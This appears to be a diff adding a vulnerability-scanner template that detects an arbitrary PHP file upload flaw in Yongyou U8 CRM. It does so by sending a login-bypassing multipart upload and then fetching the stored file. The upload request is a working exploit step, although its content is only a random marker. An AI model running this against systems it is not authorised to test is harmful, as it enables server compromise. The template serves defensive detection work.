@@ -1,0 +1,57 @@
+id: poc-yaml-yongyon-u8-crm-uploadfile-php-anyfile-upload
+info:
+  name: Yongyou U8CRM uploadfile.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{base64(rand_text_alphanumeric(4))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
+
+        -----------------------------269520967239406871642430066855
+        Content-Disposition: form-data; name="file"; filename="exploit.php "
+        Content-Type: application/octet-stream
+
+        {{t1}}
+        -----------------------------269520967239406871642430066855
+        Content-Disposition: form-data; name="upload"
+
+        upload
+        -----------------------------269520967239406871642430066855--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "tmpfile\\\\/(?P<file>.*).tmp.php"
+        internal: true
+
+  - raw:
+      - |
+        GET /tmpfile/{{file}}.tmp.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
